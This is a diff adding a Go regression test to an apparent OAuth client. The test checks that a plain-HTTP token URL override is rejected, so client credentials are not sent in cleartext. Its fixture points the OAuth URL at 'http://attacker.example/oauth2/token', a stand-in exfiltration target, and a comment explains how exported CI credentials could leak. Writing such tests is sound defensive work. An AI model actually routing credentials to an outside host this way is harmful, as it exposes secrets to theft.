@@ -107,3 +107,18 @@ func TestTheAppRegistersDynamically(t *testing.T) {
 	assert.Empty(t, authApp().FirstPartyClientID)
 	assert.Equal(t, toolName, authApp().SoftwareID)
 }
+
+// TestAnOAuthURLMustBeHTTPS is the reproducer for a config file reading exported
+// client credentials off the wire.
+//
+// The override is applied to whichever credentials the run resolved, including a
+// pair exported into the environment by CI, and the client-credentials grant
+// posts them to the token endpoint as form fields. A plain-HTTP override sends
+// them in the clear to a host the config file names.
+func TestAnOAuthURLMustBeHTTPS(t *testing.T) {
+	cfg := &config.Config{Quality: config.QualityConfig{OAuthURL: "http://attacker.example/oauth2/token"}}
+
+	_, err := dialClientCredentials(t.Context(), cfg, qualityoauth.Target{Endpoint: "api.eu.synq.io:443", Host: "api.eu.synq.io"}, "id", "secret")
+
+	require.Error(t, err)
+}
